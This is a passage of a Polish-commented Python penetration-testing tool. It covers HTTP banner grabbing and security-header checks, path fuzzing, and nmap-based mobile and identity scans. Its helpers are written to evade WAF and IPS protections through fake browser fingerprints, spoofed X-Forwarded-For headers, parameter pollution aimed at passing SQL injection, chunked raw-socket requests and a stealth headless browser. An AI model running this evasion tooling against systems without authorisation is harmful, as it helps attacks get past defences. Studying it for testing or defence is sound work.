    return alive

# =========================
# BANNER GRABBER
# =========================
def _analyze_security_headers(headers):
    missing = []
    for header, (desc, risk) in SECURITY_HEADERS.items():
        if header.lower() not in {k.lower() for k in headers}:
            missing.append({"header": header, "desc": desc, "risk": risk})

    leaking = []
    for header, desc in DANGEROUS_HEADERS.items():
        val = headers.get(header, "")
        if val:
            leaking.append({"header": header, "value": val, "desc": desc})

    return {"missing": missing, "leaking": leaking}

def fetch_single_banner(ip, port, proto):
    host_part = f"[{ip}]" if is_ipv6(ip) else ip
    url = f"{proto}://{host_part}:{port}"
    ua  = random.choice(USER_AGENTS)
    try:
        req = urllib.request.Request(url, headers={"User-Agent": ua})
        ctx = get_ssl_ctx()
        res = urllib.request.urlopen(req, timeout=4, context=ctx)
        body = res.read(4096).decode("utf-8", errors="ignore")

        title = ""
        bl = body.lower()
        if "<title>" in bl and "</title>" in bl:
            s = bl.index("<title>") + 7
            e = bl.index("</title>")
            title = body[s:e].strip()

        sec_analysis = _analyze_security_headers(res.headers)

        return {
            "url": url, "port": port, "proto": proto, "status": res.status,
            "server": res.headers.get("Server", ""),
            "powered_by": res.headers.get("X-Powered-By", ""),
            "title": title, "body": body[:1500],
            "security_headers": sec_analysis,
            "success": True
        }
    except Exception:
        return {"url": url, "success": False}

def banner_grabber(ip):
    log("scan", f"Banner Grabber: {c(C.WHITE+C.BOLD, ip)}")
    results = []
    tasks   = []

    with ThreadPoolExecutor(max_workers=10) as ex:
        for port in BANNER_PORTS:
            for proto in ["http", "https"]:
                tasks.append(ex.submit(fetch_single_banner, ip, port, proto))

        for future in as_completed(tasks):
            res = future.result()
            if res.get("success"):
                results.append(res)
                sc = C.GREEN if res["status"] < 400 else C.YELLOW
                log("ok", f"  {c(sc, str(res['status'])):<5} {c(C.WHITE, res['url']):<50} {c(C.DIM, res['server']):<25} {c(C.CYAN, res['title'][:50])}")

                sec = res.get("security_headers", {})
                missing = sec.get("missing", [])
                leaking = sec.get("leaking", [])

                high = [m for m in missing if m["risk"] == "HIGH"]
                med  = [m for m in missing if m["risk"] == "MEDIUM"]
                low  = [m for m in missing if m["risk"] == "LOW"]

                for m in high:
                    log("vuln", f"    Brak {c(C.RED+C.BOLD, m['header'])} [{m['risk']}] — {m['desc']}")
                for m in med:
                    log("warn", f"    Brak {c(C.YELLOW, m['header'])} [{m['risk']}] — {m['desc']}")
                for m in low:
                    log("info", f"    Brak {c(C.DIM, m['header'])} [{m['risk']}]")
                for lk in leaking:
                    log("warn", f"    Info-leak: {c(C.YELLOW, lk['header'])}: {c(C.DIM, lk['value'][:60])} — {lk['desc']}")

    if not results:
        log("warn", "Brak odpowiedzi HTTP na skanowanych portach.")
        return []

    ts       = now()
    safe_ip  = ip_to_filename(ip)
    html_file = f"{HTML_DIR}/banner_{safe_ip}_{ts}.html"
    _write_banner_html(ip, results, html_file)

    json_file = f"{REPORT_DIR}/banner_{safe_ip}_{ts}.json"
    with open(json_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    print()
    log("ok", f"HTML  : {html_file}")
    log("ok", f"JSON  : {json_file}")
    return results

def _write_banner_html(ip, results, path):
    rows = ""
    for r in results:
        sc = "#0f0" if r["status"] < 400 else "#ff0"
        body_esc = r["body"].replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

        sec = r.get("security_headers", {})
        missing = sec.get("missing", [])
        leaking = sec.get("leaking", [])

        sec_html = ""
        if missing or leaking:
            risk_colors = {"HIGH": "#ff4444", "MEDIUM": "#ffaa00", "LOW": "#888888"}
            sec_html += '<div class="sec-section"><div class="sec-title">🔒 Security Headers</div>'
            sec_html += '<div class="sec-grid">'
            for m in missing:
                col = risk_colors.get(m["risk"], "#888")
                sec_html += (
                    f'<div class="sec-badge missing" style="border-color:{col}">'
                    f'<span class="risk-tag" style="color:{col}">{m["risk"]}</span>'
                    f'<b>BRAK: {m["header"]}</b><br>'
                    f'<small>{m["desc"]}</small></div>'
                )
            for lk in leaking:
                sec_html += (
                    f'<div class="sec-badge leaking">'
                    f'<span class="risk-tag" style="color:#ffaa00">INFO-LEAK</span>'
                    f'<b>{lk["header"]}</b>: <code>{lk["value"][:80]}</code><br>'
                    f'<small>{lk["desc"]}</small></div>'
                )
            sec_html += '</div></div>'

        rows += f"""
<div class="entry">
  <div class="url"><a href="{r['url']}" target="_blank">{r['url']}</a><span class="badge" style="color:{sc}">{r['status']}</span></div>
  <div class="meta">Server: <b>{r['server'] or '—'}</b> &nbsp;|&nbsp; X-Powered-By: <b>{r['powered_by'] or '—'}</b></div>
  <div class="title">Title: {r['title'] or '—'}</div>
  {sec_html}
  <details><summary>Body preview</summary><pre>{body_esc}</pre></details>
</div>"""

    all_missing_high   = sum(1 for r in results
        for m in r.get("security_headers", {}).get("missing", []) if m["risk"] == "HIGH")
    all_missing_medium = sum(1 for r in results
        for m in r.get("security_headers", {}).get("missing", []) if m["risk"] == "MEDIUM")
    all_leaking = sum(1 for r in results
        for _ in r.get("security_headers", {}).get("leaking", []))

    summary_bar = (
        f'<div class="summary-bar">'
        f'<span style="color:#ff4444">⚠ HIGH: {all_missing_high}</span> &nbsp;|&nbsp; '
        f'<span style="color:#ffaa00">⚠ MEDIUM: {all_missing_medium}</span> &nbsp;|&nbsp; '
        f'<span style="color:#aaa">ℹ Info-leaks: {all_leaking}</span>'
        f'</div>'
    )

    html = f"""<!DOCTYPE html><html lang="pl"><head><meta charset="UTF-8">
<title>Banner Grabber — {ip}</title>
<style>
body{{background:#0d0d0d;color:#ccc;font-family:monospace;padding:24px;max-width:1100px;margin:auto}}
h1{{color:#0f0;border-bottom:1px solid #333;padding-bottom:8px}}
a{{color:#0af;text-decoration:none}} a:hover{{text-decoration:underline}}
.entry{{border:1px solid #2a2a2a;border-radius:6px;margin:12px 0;padding:12px;background:#111}}
.url{{font-size:1.05em;margin-bottom:6px}}
.badge{{margin-left:10px;font-weight:bold;font-size:.9em}}
.meta{{color:#777;font-size:.88em;margin-bottom:4px}}
.title{{color:#0f0;font-size:.9em;margin-bottom:6px}}
pre{{background:#0a0a0a;padding:10px;overflow:auto;max-height:220px;font-size:.78em;border-radius:4px;border:1px solid #222;white-space:pre-wrap;word-break:break-all}}
details summary{{cursor:pointer;color:#0af;font-size:.88em;margin-top:6px;user-select:none}}
details summary:hover{{color:#fff}}
.sec-section{{margin:8px 0 4px 0;border-top:1px solid #222;padding-top:8px}}
.sec-title{{color:#0af;font-size:.88em;font-weight:bold;margin-bottom:6px}}
.sec-grid{{display:flex;flex-wrap:wrap;gap:8px}}
.sec-badge{{border:1px solid #444;border-radius:4px;padding:6px 10px;font-size:.78em;max-width:340px;background:#0d0d0d}}
.sec-badge.missing{{background:#1a0000}}
.sec-badge.leaking{{background:#1a1200}}
.risk-tag{{font-weight:bold;font-size:.85em;margin-right:6px}}
code{{color:#ffaa00;background:#111;padding:1px 4px;border-radius:2px}}
.summary-bar{{background:#111;border:1px solid #333;border-radius:4px;padding:10px 16px;margin-bottom:16px;font-size:.9em}}
</style></head>
<body>
<h1>🌐 Banner Grabber — {ip}</h1>
<p style="color:#555">Wygenerowano: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | Portów: {len(BANNER_PORTS)} | Wyników: {len(results)}</p>
{summary_bar}
{rows}
</body></html>"""
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)

# =========================
# [v3.6] SMART HEADERS & RATE-LIMIT
# =========================

def _smart_headers(base_url=None):
    """
    Buduje spójny słownik nagłówków HTTP naśladujący prawdziwą przeglądarkę.
    Dobiera Sec-Ch-Ua pasujące do wylosowanego User-Agent (Client Hints).
    WAF widzi kompletny fingerprint — brak tych nagłówków przy Chrome UA
    to natychmiastowy sygnał bota.
    """
    ua = random.choice(USER_AGENTS)
    headers = {"User-Agent": ua}

    # Dobór Client Hints (Sec-Ch-Ua) pasujących do UA
    ch_ua, ch_platform = None, None
    for key, (ch, plat) in _CH_UA_MAP.items():
        if key in ua:
            ch_ua, ch_platform = ch, plat
            break

    if ch_ua:
        headers["Sec-Ch-Ua"]          = ch_ua
        headers["Sec-Ch-Ua-Mobile"]   = "?0"
        headers["Sec-Ch-Ua-Platform"] = ch_platform or '"Windows"'
        headers["Sec-Fetch-Site"]     = random.choice(["none", "same-origin", "cross-site"])
        headers["Sec-Fetch-Mode"]     = "navigate"
        headers["Sec-Fetch-Dest"]     = "document"

    # Accept-Language — inna wartość za każdym razem
    headers["Accept-Language"] = random.choice(_ACCEPT_LANGUAGES)
    headers["Accept"]          = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    headers["Accept-Encoding"] = "gzip, deflate, br"
    headers["Connection"]      = "keep-alive"
    headers["Cache-Control"]   = random.choice(["no-cache", "max-age=0"])
    headers["DNT"]             = "1"
    headers["Upgrade-Insecure-Requests"] = "1"  # [v3.7] brak tego nagłówka = sygnatura bota

    # Referer — losowy lub brak (jak przy wejściu bezpośrednim)
    ref = random.choice(_REFERER_POOL)
    if ref:
        headers["Referer"] = ref

    # X-Forwarded-For — czasem pomaga na źle skonfigurowane proxy/WAF
    if random.random() < 0.4:
        headers["X-Forwarded-For"] = random.choice(_XFF_POOL)

    return ua, headers


def _rl_key(url):
    """Zwraca klucz per-IP z URL (hostname lub IP)."""
    try:
        return urlparse(url).hostname or url
    except Exception:
        return url


def _check_rate_limit(url):
    """
    [v3.7] Sprawdza czy cooldown jest aktywny dla konkretnego hosta.
    Jeśli tak — blokuje tylko wątek skanujący ten cel, inne hosty działają normalnie.
    """
    key = _rl_key(url)
    with _RL_LOCK:
        state = _RL_STATE.get(key)
        if not state or not state["triggered"]:
            return
        elapsed   = time.time() - state["trigger_time"]
        remaining = COOLDOWN_TIME - elapsed
        if remaining <= 0:
            state["triggered"]  = False
            state["hit_count"]  = 0
            log("ok", f"Cooldown zakończony dla {key} — wznawianie skanowania.")
            return
    # czekaj poza lockiem — nie trzymamy locka podczas sleep
    log("warn", f"[{key}] Cooldown aktywny — czekam {remaining:.0f}s...")
    time.sleep(remaining + random.uniform(1, 5))


def _register_rate_limit_hit(url, status_code):
    """
    [v3.7] Rejestruje błąd rate-limit per-IP.
    Po 3 błędach 429/503/403 z rzędu aktywuje cooldown dla tego hosta.
    """
    key = _rl_key(url)
    with _RL_LOCK:
        state = _RL_STATE.setdefault(key, {"triggered": False, "trigger_time": 0.0, "hit_count": 0})
        if status_code in (429, 503, 403):
            state["hit_count"] += 1
            if state["hit_count"] >= 3 and not state["triggered"]:
                state["triggered"]    = True
                state["trigger_time"] = time.time()
                log("warn", f"[{key}] Rate-limit wykryty! ({status_code} x3) — Cooldown {COOLDOWN_TIME}s aktywny.")
        else:
            state["hit_count"] = 0  # reset przy sukcesie


def _hpp_url(url):
    """
    [v3.6] HTTP Parameter Pollution — duplikuje każdy parametr GET.
    Np. ?id=1&cat=5  →  ?id=1&cat=5&id=1&cat=5
    Niektóre WAF sprawdzają tylko pierwszy wystąpienie parametru,
    serwer WWW może czytać ostatnie — ładunek SQLi trafia do bazy.
    """
    parsed = urlparse(url)
    if not parsed.query:
        return url
    params = parse_qs(parsed.query, keep_blank_values=True)
    # Zbuduj zduplikowany query string
    parts = []
    for k, vals in params.items():
        for v in vals:
            parts.append(f"{k}={v}")
    for k, vals in params.items():
        for v in vals:
            parts.append(f"{k}={v}")
    new_query = "&".join(parts)
    return parsed._replace(query=new_query).geturl()


def _send_chunked(url, payload_data=b"", chunk_size=8, max_redirects=3):
    """
    [v3.6] Wysyła żądanie POST z Chunked Transfer Encoding przez raw socket.
    Wiele systemów IPS nie składa fragmentów z powrotem przed analizą.
    Zwraca (status_code, response_headers_dict, body_bytes) lub (None, {}, b'').

    [v3.7] Obsługa przekierowań (301/302/307/308) — śledzi Location do max_redirects razy.
    Przekierowanie na HTTPS jest obsługiwane przez fallback do urllib (raw socket nie wspiera TLS).
    Użycie raw socket ograniczone do HTTP.
    """
    for _redirect in range(max_redirects + 1):
        parsed = urlparse(url)
        if parsed.scheme != "http":
            # [v3.7] Przekierowanie trafiło na HTTPS — fallback do urllib
            if parsed.scheme == "https":
                log("info", f"_send_chunked: przekierowanie na HTTPS — fallback urllib dla {url}")
                try:
                    req = urllib.request.Request(url, data=payload_data or None)
                    ctx = get_ssl_ctx()
                    res = urllib.request.urlopen(req, timeout=10, context=ctx)
                    body = res.read(8192)
                    hdrs = {k.lower(): v for k, v in res.headers.items()}
                    return res.status, hdrs, body
                except Exception:
                    return None, {}, b""
            log("warn", "_send_chunked: obsługiwane tylko HTTP/HTTPS")
            return None, {}, b""

        host     = parsed.netloc
        path     = parsed.path or "/"
        if parsed.query:
            path += "?" + parsed.query
        port     = parsed.port or 80
        hostname = parsed.hostname

        chunks = [payload_data[i:i+chunk_size] for i in range(0, len(payload_data), chunk_size)]
        if not chunks:
            chunks = [b""]

        chunk_encoded = b""
        for ch in chunks:
            size_hex = hex(len(ch))[2:].encode()
            chunk_encoded += size_hex + b"\r\n" + ch + b"\r\n"
        chunk_encoded += b"0\r\n\r\n"

        request = (
            f"POST {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Transfer-Encoding: chunked\r\n"
            f"Content-Type: application/x-www-form-urlencoded\r\n"
            f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode() + chunk_encoded

        try:
            with socket.create_connection((hostname, port), timeout=10) as sock:
                sock.sendall(request)
                response = b""
                while True:
                    data = sock.recv(4096)
                    if not data:
                        break
                    response += data
        except Exception:
            return None, {}, b""

        if b"\r\n\r\n" not in response:
            return None, {}, response

        header_part, body = response.split(b"\r\n\r\n", 1)
        lines  = header_part.decode("utf-8", errors="ignore").splitlines()
        status = int(lines[0].split()[1]) if lines and len(lines[0].split()) >= 2 else None
        headers = {}
        for line in lines[1:]:
            if ":" in line:
                k, v = line.split(":", 1)
                headers[k.strip().lower()] = v.strip()

        # [v3.7] Obsługa przekierowań
        if status in (301, 302, 307, 308) and "location" in headers:
            new_url = headers["location"]
            if not new_url.startswith("http"):
                new_url = urljoin(url, new_url)
            log("info", f"_send_chunked: przekierowanie {status} → {new_url}")
            url = new_url
            continue  # następna iteracja z nowym URL

        return status, headers, body

    log("warn", f"_send_chunked: przekroczono limit {max_redirects} przekierowań")
    return None, {}, b""


# =========================
# [v3.6] HEADLESS BROWSER SCAN (Playwright)
# =========================
def headless_scan(url):
    """
    Komenda: hw <URL>
    Skanuje URL przez pełną przeglądarkę Chromium (Playwright).
    ModSecurity i nowoczesne WAF-y widzą kompletny fingerprint przeglądarki,
    wykonanie JS, poprawne załadowanie zasobów — szansa na blokadę drastycznie spada.

    Wymaga: pip install playwright --break-system-packages && playwright install chromium
    """
    log("scan", f"Headless Browser Scan (Playwright): {c(C.WHITE+C.BOLD, url)}")

    # Sprawdź dostępność
    try:
        from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout
    except ImportError:
        log("err", "Playwright niedostępny.")
        log("info", "Zainstaluj: pip install playwright --break-system-packages")
        log("info", "Następnie:  playwright install chromium")
        return {"url": url, "error": "playwright_missing"}

    result = {
        "url":         url,
        "status":      None,
        "title":       None,
        "headers":     {},
        "body_length": 0,
        "screenshot":  None,
        "cookies":     [],
        "js_errors":   [],
        "links":       [],
        "waf_hint":    None,
    }

    ts   = now()
    safe = "".join(ch if ch.isalnum() or ch in "-_." else "_" for ch in url)[:80]
    screenshot_path = f"{REPORT_DIR}/headless_{safe}_{ts}.png"
    json_path       = f"{REPORT_DIR}/headless_{safe}_{ts}.json"

    try:
        with sync_playwright() as pw:
            browser = pw.chromium.launch(
                headless=True,
                args=[
                    "--disable-blink-features=AutomationControlled",
                    "--no-sandbox",
                    "--disable-dev-shm-usage",
                ]
            )
            ctx = browser.new_context(
                user_agent=random.choice([ua for ua in USER_AGENTS if "Chrome" in ua]),
                locale=random.choice(["pl-PL", "en-US", "en-GB"]),
                timezone_id="Europe/Warsaw",
                viewport={"width": random.choice([1280, 1366, 1920]),
                          "height": random.choice([720, 768, 1080])},
                extra_http_headers={
                    "Accept-Language": random.choice(_ACCEPT_LANGUAGES),
                    "DNT": "1",
                },
            )

            page = ctx.new_page()
            page.on("console", lambda msg: None)
            page.on("pageerror", lambda err: result["js_errors"].append(str(err)[:200]))

            # Przechwytuj nagłówki odpowiedzi
            def on_response(response):
                if response.url == url or result["status"] is None:
                    result["status"]  = response.status
                    result["headers"] = dict(response.headers)
            page.on("response", on_response)

            log("info", "Ładowanie strony przez Chromium (max 30s)...")
            try:
                page.goto(url, wait_until="networkidle", timeout=30_000)
            except PWTimeout:
                log("warn", "Timeout podczas ładowania — pobrano częściowy wynik")

            result["title"]       = page.title()
            result["body_length"] = len(page.content())
            result["cookies"]     = [c["name"] for c in ctx.cookies()]

            # Zbierz linki z parametrami (wektory ataku)
            hrefs = page.eval_on_selector_all("a[href]", "els => els.map(e => e.href)")
            result["links"] = [h for h in hrefs if "?" in h][:30]

            # Zapis screenshotu
            try:
                page.screenshot(path=screenshot_path, full_page=False)
                result["screenshot"] = screenshot_path
                log("ok", f"Screenshot: {screenshot_path}")
            except Exception:
                pass

            # Prosty WAF-hint
            body_lower = page.content().lower()
            for waf_sig in ["cloudflare", "incapsula", "sucuri", "modsecurity",
                            "akamai", "f5 big-ip", "barracuda", "fortiweb"]:
                if waf_sig in body_lower:
                    result["waf_hint"] = waf_sig.capitalize()
                    log("warn", f"WAF wykryty w treści strony: {c(C.YELLOW+C.BOLD, waf_sig.upper())}")
                    break

            browser.close()

    except Exception as e:
        log("err", f"Błąd Playwright: {e}")
        result["error"] = str(e)

    # Podsumowanie
    div = c(C.CYAN+C.BOLD, "═" * 60)
    print(f"\n{div}")
    print(c(C.CYAN+C.BOLD, f"  🌐 HEADLESS SCAN: {url}"))
    print(div)
    log("info", f"Status HTTP  : {c(C.GREEN if result['status'] == 200 else C.YELLOW, str(result['status']))}")
    log("info", f"Tytuł strony : {result['title'] or '—'}")
    log("info", f"Rozmiar body : {result['body_length']} B")
    log("info", f"Ciasteczka   : {', '.join(result['cookies']) or 'brak'}")
    if result["waf_hint"]:
        log("vuln", f"WAF Hint     : {c(C.RED+C.BOLD, result['waf_hint'])}")
    if result["links"]:
        log("info", f"Wektory ataku (linki z params): {len(result['links'])}")
        for lnk in result["links"][:8]:
            print(c(C.DIM, f"    {lnk[:100]}"))
    if result["js_errors"]:
        log("warn", f"Błędy JS: {len(result['js_errors'])}")
    print(div + "\n")

    try:
        with open(json_path, "w", encoding="utf-8") as f:
            json.dump(result, f, indent=2, ensure_ascii=False)
        log("ok", f"Raport JSON  : {json_path}")
    except Exception as e:
        log("err", f"Zapis raportu: {e}")

    return result


# =========================
# [v3.6] HPP TESTER (standalone)
# =========================
def hpp_test(url):
    """
    Komenda: hpp <URL>
    Demonstruje HTTP Parameter Pollution — wysyła żądanie
    z oryginalnymi + zduplikowanymi parametrami GET.
    Porównuje odpowiedź z bazową (bez duplikacji).
    """
    log("scan", f"HTTP Parameter Pollution Test: {c(C.WHITE+C.BOLD, url)}")
    _, headers = _smart_headers(url)

    def _fetch(target_url):
        try:
            req = urllib.request.Request(target_url, headers=headers)
            ctx = get_ssl_ctx()
            res = urllib.request.urlopen(req, timeout=8, context=ctx)
            body = res.read(4096)
            return res.status, hashlib.md5(body).hexdigest(), len(body)
        except HTTPError as e:
            return e.code, None, 0
        except Exception:
            return None, None, 0

    hpp_url = _hpp_url(url)
    log("info", f"Oryginalny URL : {url}")
    log("info", f"HPP URL        : {hpp_url}")

    status_orig, hash_orig, len_orig = _fetch(url)
    status_hpp,  hash_hpp,  len_hpp  = _fetch(hpp_url)

    print()
    log("info", f"Odpowiedź oryginalna : status={status_orig} hash={hash_orig} len={len_orig}B")
    log("info", f"Odpowiedź HPP        : status={status_hpp}  hash={hash_hpp}  len={len_hpp}B")

    if hash_orig and hash_hpp and hash_orig != hash_hpp:
        log("vuln", "HPP RÓŻNICA WYKRYTA — odpowiedzi różnią się treścią! WAF może traktować inaczej.")
    elif status_orig != status_hpp:
        log("warn", f"HPP zmienił status odpowiedzi: {status_orig} → {status_hpp}")
    else:
        log("ok", "HPP — brak różnicy w odpowiedziach (serwer/WAF obsługuje poprawnie lub catch-all).")

    return {"url": url, "hpp_url": hpp_url,
            "original": {"status": status_orig, "len": len_orig},
            "hpp":      {"status": status_hpp,  "len": len_hpp},
            "difference": hash_orig != hash_hpp if hash_orig and hash_hpp else None}


# =========================
# [v3.6] FUZZER — z rate limitingiem i zewnętrznym słownikiem
_FUZZ_SEMAPHORE = threading.BoundedSemaphore(10)

def _get_baseline(base_url):
    fake_url = f"{base_url}/mrroot_baseline_nonexistent_{random.randint(10000, 99999)}"
    ua = random.choice(USER_AGENTS)
    try:
        req = urllib.request.Request(fake_url, headers={"User-Agent": ua})
        ctx = get_ssl_ctx()
        res = urllib.request.urlopen(req, timeout=3, context=ctx)
        body = res.read(2048)
        return hashlib.md5(body).hexdigest(), len(body)
    except HTTPError as e:
        try:
            body = e.read(2048)
            return hashlib.md5(body).hexdigest(), len(body)
        except Exception:
            return None, None
    except Exception:
        return None, None

def _fetch_fuzz(url, baseline_hash=None, baseline_len=None):
    with _FUZZ_SEMAPHORE:
        # [v3.6] Sprawdź cooldown przed żądaniem
        _check_rate_limit(url)
        # [v3.6] Smart Delay + Jitter — losowy delay zamiast stałego
        jitter = random.uniform(JITTER_MIN, JITTER_MAX)
        time.sleep(FUZZ_DELAY + jitter)

        # [v3.6] Spójne nagłówki przeglądarki
        _ua, headers = _smart_headers(url)
        try:
            req = urllib.request.Request(url, headers=headers)
            ctx = get_ssl_ctx()
            res = urllib.request.urlopen(req, timeout=3, context=ctx)
            body = res.read(2048)
            body_hash = hashlib.md5(body).hexdigest()
            body_len  = len(body)

            _register_rate_limit_hit(url, res.status)  # reset licznika przy sukcesie

            if baseline_hash and body_hash == baseline_hash:
                return {"url": url, "success": False, "reason": "catch-all"}

            if baseline_len and abs(body_len - baseline_len) < 50:
                return {"url": url, "success": False, "reason": "similar-length"}

            return {
                "url": url, "status": res.status,
                "length": body_len, "hash": body_hash, "success": True
            }
        except HTTPError as e:
            _register_rate_limit_hit(url, e.code)
            if e.code in [401, 403]:
                return {"url": url, "status": e.code, "length": 0, "success": True}
            return {"url": url, "status": e.code, "success": False}
        except Exception:
            return {"url": url, "success": False}

def _load_wordlist(path):
    try:
        with open(path, encoding="utf-8", errors="ignore") as f:
            paths = [line.strip() for line in f if line.strip() and not line.startswith("#")]
        log("ok", f"Wczytano zewnętrzny słownik: {len(paths)} wpisów z {path}")
        return paths
    except Exception as e:
        log("err", f"Nie można wczytać słownika {path}: {e}")
        return FUZZ_PATHS

def fuzz_scan(ip, wordlist_file=None):
    log("scan", f"Fuzzer Ścieżek: {c(C.WHITE+C.BOLD, ip)}")
    if not STRICT_SSL:
        log("warn", "SSL: tryb unverified (pentest). Użyj --strict-ssl dla weryfikacji certyfikatów.")

    paths = _load_wordlist(wordlist_file) if wordlist_file else FUZZ_PATHS
    log("info", f"Słownik: {len(paths)} ścieżek | Delay: {FUZZ_DELAY*1000:.0f} ms")

    host_part = f"[{ip}]" if is_ipv6(ip) else ip
    base_urls = [
        f"http://{host_part}",
        f"https://{host_part}",
        f"http://{host_part}:8080",
        f"https://{host_part}:8443"
    ]

    baselines = {}
    for base_url in base_urls:
        log("info", f"Pobieranie baseline dla {base_url}...")
        bh, bl = _get_baseline(base_url)
        baselines[base_url] = (bh, bl)
        if bh:
            log("info", f"  Baseline hash: {bh[:12]}… len: {bl} B")
        else:
            log("warn", f"  Brak baseline — serwer niedostępny lub 4xx/5xx na każdym żądaniu")

    results = []
    tasks   = []

    with ThreadPoolExecutor(max_workers=10) as ex:
        for base_url in base_urls:
            bh, bl = baselines.get(base_url, (None, None))
            for path in paths:
                url = f"{base_url}{path}"
                tasks.append(ex.submit(_fetch_fuzz, url, bh, bl))

        for future in as_completed(tasks):
            res = future.result()
            if res.get("success"):
                results.append(res)
                sc = C.GREEN if res.get("status") in [200, 401, 403] else C.YELLOW
                length_info = c(C.DIM, f"({res.get('length', '?')} B)")
                log("ok", f"  {c(sc, str(res['status'])):<5} {c(C.WHITE, res['url'])} {length_info}")

    if not results:
        log("warn", "Brak wyników — wszystkie odpowiedzi to catch-all lub serwer niedostępny.")
        return []

    ts = now()
    json_file = f"{REPORT_DIR}/fuzz_{ip_to_filename(ip)}_{ts}.json"
    with open(json_file, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, ensure_ascii=False)

    print()
    log("ok", f"Znaleziono: {c(C.GREEN+C.BOLD, str(len(results)))} wyników | Raport JSON: {json_file}")
    return results

# =========================
# [v3.4] MOBILE SCAN
# =========================
def mobile_scan(ip):
    log("scan", f"Mobile Scan: {c(C.WHITE+C.BOLD, ip)}")
    nm  = nmap.PortScanner()
    res = {
        "ip":          ip,
        "open_ports":  [],
        "mdns_mobile": None,
        "os_hint":     None,
    }

    port_list = ",".join(str(p) for p in MOBILE_PORTS)
    log("info", f"Skanowanie portów mobilnych: {port_list}")
    try:
        nm.scan(
            hosts=ip,
            arguments=f"-sV -p {port_list} -T4 --host-timeout 60s --max-retries 2"
        )
    except Exception as e:
        log("err", f"Mobile port scan error: {e}")

    div = c(C.CYAN+C.BOLD, "═" * 55)
    print(f"\n{div}")
    print(c(C.CYAN+C.BOLD, f"  📱 MOBILE SCAN: {ip}"))
    print(div)

    if ip in nm.all_hosts():
        tcp = nm[ip].get("tcp", {})
        for port, desc in sorted(MOBILE_PORTS.items()):
            if port in tcp:
                state   = tcp[port].get("state", "")
                service = tcp[port].get("name", "")
                version = tcp[port].get("version", "")
                product = tcp[port].get("product", "")
                if state == "open":
                    detail = f"{product} {version}".strip() or service
                    log("ok", f"  {c(C.GREEN+C.BOLD, 'OPEN')} TCP/{port:<6} {c(C.YELLOW, desc):<40} {c(C.DIM, detail)}")
                    res["open_ports"].append({
                        "port": port, "desc": desc, "service": service,
                        "product": product, "version": version
                    })
                    if port == 5555 and not res["os_hint"]:
                        res["os_hint"] = "Android (ADB przez Wi-Fi wykryty!)"
                    elif port == 62078 and not res["os_hint"]:
                        res["os_hint"] = "iOS (Apple Lockdown/Wi-Fi Sync)"
                    elif port in (7000, 7100) and not res["os_hint"]:
                        res["os_hint"] = "Apple (AirPlay)"
                elif state in ("filtered", "open|filtered"):
                    log("info", f"  {c(C.DIM, 'FILT')} TCP/{port:<6} {c(C.DIM, desc)}")
    else:
        log("warn", "Host niedostępny lub brak odpowiedzi na portach mobilnych.")

    log("info", "mDNS fingerprint (iOS/Android)...")
    _IOS_SERVICES     = ["_apple-mobdev2", "_airplay", "_sleep-proxy",
                         "_companion-link", "_apple-pairable"]
    _ANDROID_SERVICES = ["_googlecast", "_androidtvremote", "adb-tls",
                         "_espressif"]
    try:
        nm2 = nmap.PortScanner()
        nm2.scan(
            hosts=ip,
            arguments="-sU -p 5353 --script dns-service-discovery -T4 --host-timeout 25s"
        )
        if ip in nm2.all_hosts():
            raw_mdns = (
                nm2[ip].get("udp", {})
                    .get(5353, {})
                    .get("script", {})
                    .get("dns-service-discovery", "")
                or ""
            )
            res["mdns_mobile"] = raw_mdns or None

            if raw_mdns:
                mdns_lower = raw_mdns.lower()
                ios_hits     = [s for s in _IOS_SERVICES     if s in mdns_lower]
                android_hits = [s for s in _ANDROID_SERVICES if s in mdns_lower]

                if ios_hits and not res["os_hint"]:
                    res["os_hint"] = f"Prawdopodobnie iOS (mDNS: {', '.join(ios_hits)})"
                elif android_hits and not res["os_hint"]:
                    res["os_hint"] = f"Prawdopodobnie Android (mDNS: {', '.join(android_hits)})"

                print()
                log("info", "mDNS records:")
                for line in raw_mdns.splitlines()[:15]:
                    print(c(C.DIM, f"    {line[:110]}"))
                if len(raw_mdns.splitlines()) > 15:
                    print(c(C.DIM, f"    ... (+{len(raw_mdns.splitlines())-15} linii)"))
    except Exception as e:
        log("warn", f"mDNS fingerprint error: {e}")

    print(f"\n{div}")
    if res["os_hint"]:
        print(c(C.GREEN+C.BOLD, f"  🔍 OS Hint: {res['os_hint']}"))
    if res["open_ports"]:
        print(c(C.YELLOW, f"  Otwarte porty mobilne: {len(res['open_ports'])}"))
    else:
        print(c(C.DIM, "  Brak otwartych portów mobilnych (urządzenie może mieć wyłączone usługi)."))
    print(f"{div}\n")

    ts       = now()
    out_file = f"{REPORT_DIR}/mobile_{ip_to_filename(ip)}_{ts}.json"
    try:
        with open(out_file, "w", encoding="utf-8") as f:
            json.dump(res, f, indent=2, ensure_ascii=False)
        log("ok", f"Raport: {out_file}")
    except Exception as e:
        log("err", f"Nie zapisano raportu: {e}")

    return res

# =========================
# IDENTITY SCAN
# =========================
def identity_scan(ip):
    log("scan", f"Identity Scan: {c(C.WHITE+C.BOLD, ip)}")
    nm  = nmap.PortScanner()
    res = {
        "ip": ip, "hostname": None, "mdns": None,
        "netbios": None, "smb": None, "upnp": None,
        "mobile_os_hint": None,
    }

    try:
        res["hostname"] = socket.gethostbyaddr(ip)[0]
    except Exception:
        pass

    _MDNS_IOS     = ["_apple-mobdev2", "_airplay", "_sleep-proxy",
                     "_companion-link", "_apple-pairable"]
    _MDNS_ANDROID = ["_googlecast", "_androidtvremote", "adb-tls"]

    for proto, port, script, name in [
        ("UDP", 5353, "dns-service-discovery", "mDNS"),
        ("UDP", 137,  "nbstat",               "NetBIOS"),
        ("UDP", 1900, "upnp-info",            "UPnP")
    ]:
        log("info", f"{name} ({proto}/{port})...")
        try:
            nm.scan(hosts=ip, arguments=f"-sU -p {port} --script {script} -T4 --host-timeout 20s")
            if ip in nm.all_hosts():
                raw = (
                    nm[ip].get("udp", {}).get(port, {}).get("script", {}).get(script)
                    or "brak danych"
                )
